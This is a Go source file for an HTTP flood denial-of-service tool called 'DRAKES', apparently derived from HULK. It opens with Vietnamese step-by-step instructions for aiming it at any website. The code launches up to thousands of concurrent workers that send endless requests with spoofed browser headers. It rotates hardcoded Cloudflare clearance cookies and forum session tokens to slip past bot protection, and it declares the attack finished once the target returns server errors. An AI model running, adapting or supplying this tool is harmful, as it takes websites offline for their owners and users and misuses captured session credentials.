package main

/*
hướng dẫn
B1. Cài đặt Golang bằng cách truy cập vào đường link như sau: https://go.dev/dl/
B2. Mở File DDos Lên Và Chọn Tốc Độ ở dưới
B3. Khởi Động CMD bằng cách nhập vào đường dẫn cmd nơi chứa folder này luôn Hoặc Terminal Lên Gõ Lên Như Sau: go run ddos.go--site Đường Link Cần DDos
ví dụ: go run ddos.go --site https://abc.abc hoặc go run traffic.go "dường dẫn đến file ddos.go" --site https://abc.abc
vì chạy bằng golang nên hiệu suất khá cao
--- Chúc Bạn Thành Công ---
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__ = "1.0.1"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false


	headersReferers []string = []string{
	"http://www.google.com/?q=",
		"https://duckduckgo.com/?q=",
		"https://www.bing.com/search?q=",
		"https://coccoc.com/search?query=",
		"https://search.aol.com/aol/search?q=",
		"https://www.ecosia.org/search?method=index&q=",
		"https://www.ask.com/web?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
                "https://www.youtube.com/results?search_query=",
                "https://www.tiktok.com/search?q=",
                "https://twitter.com/search?q=",
                "https://www.shodan.io/search?query=",
                "http://web.archive.org/web/20230000000000*/",
                "https://www.reddit.com/search/?q=",
                "https://www.quora.com/search?q=",
                "https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	headersUseragents []string = []string{
"cf_clearance=tiQggH2GqK.LFUEMu9YhLKmBzKqD2A1uoVl53uXaB1Q-1683045824-0-250; xfa_csrf=mMo6cdtoXLYMUlqv",
"cf_clearance=ssDBEQH_MMdRHUnDg0ABPH5NxioTpzuVIqNw6eGBrLw-1683046167-0-250; xfa_csrf=5xKMvdAhAOBtXyMY",
"cf_clearance=kg8ms6fZNhqNhWF_y58mA.w_oZ2oaQQH7amSssle5XI-1683045837-0-250; xfa_csrf=BMp7r7dSsLQ1AEgj",
"cf_clearance=2OhCaX.mPiNMCfnYoD0D4b5GqsprBg9yqOkbHslGobM-1682949758-0-250; xfa_user=407439%2C4yDag8pQZ7mjTkls8CfB3NF7erXlIPZRCymF_131; xfa_csrf=LhFzJFE1z4j-B-fj; xfa_session=IkBSvydAq0gw57A0KoiOlwJs97LmJsVx",
"cf_clearance=5BL46LQ7FdGInA.imqgbUjibmlrejsDUHjp59h3rlSk-1683046485-0-250; xfa_csrf=lJXfgJ2pnHqwopSo",
"cf_clearance=H9v0O46ctZ5YAycFKL317C3IaaPdQNnv9iW80jHFX5c-1683047000-0-250; xfa_csrf=orITaiMQ9rITt5e5; xfa_user=407439%2CLfhGrg8KP3JEHADiOcoGq67P6SCD-xOb-gryKd5A; xfa_session=u6ucGnWQJpONJ8VBGF7N9b2jvdLhrPoO",
"cf_clearance=VAQUw6JCWSOOEwkoC69WKRfPZzEwf20l.xKjXaCKhwY-1683047266-0-250; xfa_csrf=S-x0yy2NRSVrpzap; xfa_user=442886%2CG1eKVbUa9ZyEoFHVvyuCg5jTLMDQ60Dp-CkFWeU4; xfa_session=SffyvZLTjY6CDapHzASOBQrnb5rr3t9T",

	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("DRAKESMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 2048 //TỐC ĐỘ 512, 1024, 2048, 4096 //chọn tốc độ ở đây
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("DRAKES", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- DRAKES Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err )
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err )
				fmt.Println("\r-- DRAKES Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	//var param_joiner string
	var client = new(http.Client)

	//if strings.ContainsRune(url, '?') {
	//	param_joiner = "&"
	//} else {
	//	param_joiner = "?"
	//}

	for {
		var q *http.Request
		var err error

		if data == "" {
			//q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
                q, err = http.NewRequest("GET", url, nil)

		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36")
                //q.Header.Set("Cache-Control", "no-cache")
              //  q.Header.Set("Authorization", "Basic Njk2OTY5OjY5Njk2OQ==")
//q.Header.Set("sec-ch-ua", '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"')
q.Header.Set("sec-ch-ua-platform", "\"Windows\"")
q.Header.Set("Sec-Fetch-Site", "same-origin")
q.Header.Set("sec-ch-ua-mobile", "?0")
q.Header.Set("Sec-Fetch-Moden", "navigate")
q.Header.Set("Sec-Fetch-Dest", "empty")
q.Header.Set("Accept-Encoding", "gzip, deflate")
q.Header.Set("Accept-Language", "en-US,en;q=0.9")
q.Header.Set("Upgrade-Insecure-Requests", "1")
q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
q.Header.Set("Cookie", headersUseragents[rand.Intn(len(headersUseragents))])
		//q.Header.Set("Accept-Charset", acceptCharset)
		//q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		//q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 500 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
